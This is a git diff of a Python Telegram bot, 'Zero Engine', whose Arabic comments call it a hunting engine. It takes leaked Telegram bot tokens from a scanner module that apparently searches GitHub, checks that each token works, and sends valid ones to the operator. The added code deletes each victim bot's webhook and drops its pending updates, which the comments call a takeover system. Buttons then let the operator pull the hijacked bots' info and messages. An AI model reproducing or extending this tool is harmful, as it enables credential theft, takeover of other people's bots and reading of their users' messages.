@@ -1,12 +1,15 @@
-import os, requests, threading, time, telebot
+import os
+import requests
+import threading
+import time
+import telebot
 from telebot import types
 from scanner import search_for_tokens
 from controller import get_bot_info, get_bot_messages
 
-# إعدادات البوت
+# إعدادات البوت الأساسية
 BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
 CHAT_ID = os.getenv('CHAT_ID')
-# GITHUB_TOKEN موجود الآن داخل scanner.py ولا نحتاجه هنا للمسح
 FOUND_FILE = "found.txt"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -19,15 +22,13 @@ def get_markup(token):
     markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
     return markup
 
-# --- معالجة الأوامر النصية (/start, /get_tokens) ---
+# --- معالجة الأوامر النصية ---
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     if str(message.chat.id) != str(CHAT_ID):
         return
-
     if message.text == "/start":
         bot.reply_to(message, "Zero Engine: البوت يعمل بكامل طاقته. أنتظر صيداً جديداً...")
-    
     elif message.text == "/get_tokens":
         if os.path.exists(FOUND_FILE) and os.path.getsize(FOUND_FILE) > 0:
             with open(FOUND_FILE, "rb") as f:
@@ -35,17 +36,16 @@ def handle_text(message):
         else:
             bot.reply_to(message, "⚠️ الملف فارغ حالياً.")
 
-# --- معالجة الضغط على الخانات ---
+# --- معالجة الضغط على الأزرار ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    if str(call.message.chat.id) != str(CHAT_ID): return
-    
+    if str(call.message.chat.id) != str(CHAT_ID):
+        return
     if call.data == "export":
         if os.path.exists(FOUND_FILE):
             with open(FOUND_FILE, "rb") as f:
                 bot.send_document(CHAT_ID, f)
         return
-
     try:
         action, token = call.data.split("|")
         res = get_bot_info(token) if action == "info" else get_bot_messages(token)
@@ -53,21 +53,27 @@ def callback_query(call):
     except Exception as e:
         bot.send_message(CHAT_ID, f"خطأ في معالجة الطلب: {e}")
 
-# --- محرك الصيد ---
+# --- محرك الصيد مع نظام الاستحواذ ---
 def run_scanner():
     while True:
         try:
-            # تم التعديل هنا: استدعاء الدالة بدون مدخلات
             tokens = search_for_tokens()
             for token in tokens:
                 if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
+                    # التحقق من فعالية التوكن
                     if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
-                        bot.send_message(CHAT_ID, f"🔥 صيد جديد:\n`{token}`", 
+                        # نظام الاستحواذ التقني
+                        try:
+                            requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook?drop_pending_updates=True", timeout=5)
+                        except: pass
+                        
+                        bot.send_message(CHAT_ID, f"🔥 تم الاستحواذ بنجاح:\n`{token}`", 
                                          parse_mode="Markdown", reply_markup=get_markup(token))
-                        with open(FOUND_FILE, "a") as f: f.write(token + "\n")
+                        with open(FOUND_FILE, "a") as f:
+                            f.write(token + "\n")
         except Exception as e:
             print(f"Scanner Loop Error: {e}")
-        time.sleep(120) # تأخير دقيقتين لزيادة الاستقرار
+        time.sleep(60)
 
 # --- التشغيل الأساسي ---
 def run_manual_polling():
@@ -86,6 +92,8 @@ if __name__ == "__main__":
         bot.delete_webhook()
     except: pass
     
+    # تشغيل الماسح في الخلفية
     threading.Thread(target=run_scanner, daemon=True).start()
+    
     print("Zero Engine: Online & Stable")
     run_manual_polling()
